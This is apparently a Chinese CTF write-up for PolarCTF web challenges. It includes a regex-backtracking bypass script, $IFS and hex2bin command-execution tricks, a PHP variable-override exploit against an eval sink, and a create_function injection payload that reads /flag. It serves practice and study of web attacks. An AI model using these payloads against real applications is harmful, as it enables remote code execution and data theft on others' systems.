# web
### swp
递归绕过正则限制
```python
import requests
data = {"xdmtql": "sys nb" + "aaaaa" * 1000000}
res = requests.post('http://d9d00980-d2fc-412e-b6cc-b6db2562eafb.www.polarctf.com:8090/index.php', data=data, allow_redirects=False)
print(res.content)

```

### 简单rce
$IFS空格绕过+sort读取文件

### 上传


### 非常好绕的命令执行

hex2bin转换
`http://1ae67e55-509c-49e4-9bf7-a04be9788ca5.www.polarctf.com:8090/?args1=hex2bin&args2='73797374656d'&args3='ls'`

### php是世界上最好的语言
变量覆盖
```php
<?php
//flag in $flag
highlight_file(__FILE__);
include("flag.php");
$c=$_POST['sys'];
$key1 = 0;
$key2 = 0;
if(isset($_GET['flag1']) || isset($_GET['flag2']) || isset($_POST['flag1']) || isset($_POST['flag2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($flag1 == '8gen1' && $flag2 == '8gen1') {
    if(isset($_POST['504_SYS.COM'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\?/", $c)){
         eval("$c");  

    }
}
}
?>
```

```http
http://www.xxx.com?_POST[flag1]=8gen1&_POST[flag2]=8gen1
post:sys=echo($flag);&504[SYS.COM=a
```

### \$\$
`$GLOBALS`全局变量
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211154038.png)


### 某函数的复仇
create_function注入

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231211163836.png)

```php
$shaw('',$root);


root=}system('more /flag');/*
shaw=create_function
```
# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-12-09   23:22